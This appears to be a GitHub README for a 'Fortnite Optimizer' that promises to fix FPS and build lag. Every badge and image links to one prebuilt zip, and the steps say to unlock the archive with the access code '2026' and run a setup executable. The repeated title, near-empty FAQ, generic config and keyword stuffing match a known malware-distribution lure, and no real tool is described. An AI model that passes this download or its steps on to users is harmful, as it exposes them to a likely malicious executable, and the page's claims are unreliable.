<div align="center">

# Fortnite Optimizer — Fortnite Optimizer — Fortnite Optimizer (Hot-Reload Config, Zero Dependencies)

<p><strong>Fortnite Optimizer — Fortnite Optimizer — Fortnite Optimizer (Hot-Reload Config, Zero Dependencies): Fortnite Optimizer — optimizer and build-lag in one tool. Native 64-bit portable build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/fn-performance-v0.1.0-win64.zip)
[![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/fn-performance-v0.1.0-win64.zip)
[![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/fn-performance-v0.1.0-win64.zip)
[![Stars](https://img.shields.io/github/stars/TestOwner/fn-performance?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)

<p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>

<a href="../../releases/download/v0.1.0/fn-performance-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download fn-performance-v0.1.0-win64.zip" width="520"></a>

<br>

<a href="../../releases/download/v0.1.0/fn-performance-v0.1.0-win64.zip"><img src="banner.svg" alt="Fortnite Optimizer Preview" width="840"></a>

</div>

---

## Executive Summary & Design

**Fortnite Optimizer — Fortnite Optimizer — optimizer and build-lag in one tool** (`fn-performance`) is a portable Windows 10/11 runtime suite: drop the prebuilt package, point it at `config/settings.json`, and go. No compiler, no external dependencies, live hot-reload included.

## Getting Started (No Compiler Needed)

| Platform | Direct Prebuilt Package | Documentation Mirror |
| :--- | :--- | :--- |
| **Windows 10 / 11 (x64)** | [**`fn-performance-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/fn-performance-v0.1.0-win64.zip) | [**Usage Guide (`docs/USAGE.md`)**](docs/USAGE.md) |

1. Download [`fn-performance-v0.1.0-win64.zip`](../../releases/download/v0.1.0/fn-performance-v0.1.0-win64.zip) using the download button above.
2. Extract the archive using the access code (`2026`).
3. Launch `FnPerformance_Setup_x64.exe` (keep `config/settings.json` in the same folder).

## FAQ

<details>
<summary><b>Build lag?</b></summary>

Fixes build delay.
</details>
<details>
<summary><b>Performance mode?</b></summary>

Profiles included.
</details>
<details>
<summary><b>Chapters?</b></summary>

All current ones.
</details>

## Configuration (`config/settings.json`)

```json
{
  "module": "fn-performance",
  "version": "0.1.0",
  "runtime": {
    "threads": 4,
    "verbose": false,
    "hot_reload": true
  },
  "modules": {
    "tuner": {
      "enabled": true
    },
    "lagfix": {
      "enabled": true
    },
    "profiles": {
      "enabled": true
    },
    "cli": {
      "enabled": true
    }
  }
}
```

## Documentation & Guides

- [FAQ — platform support, data storage](docs/FAQ.md)
- [Usage Guide — commands and options](docs/USAGE.md)
- [Changelog — v0.1.0 and later](CHANGELOG.md)
- [Contributing — setup, ground rules, PR flow](CONTRIBUTING.md)

## Building from Source

```bash
git clone https://github.com/TestOwner/fn-performance.git
cd fn-performance
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

---
<sub>Indexed tags: fn-performance, fps, build-lag, boost, gaming-tools, performance, windows, fortnite, optimizer, cli, developer-tools, open-source, automation, productivity, cpp, portable, prebuilt, tools</sub>

## Keywords

fortnite optimizer fps build-lag boost gaming-tools performance windows fortnite-fps-tool fn-performance fortnite-optimizer windows portable prebuilt x64 free download
related: fortnite, optimizer, fps, build-lag, boost, gaming-tools, performance, windows
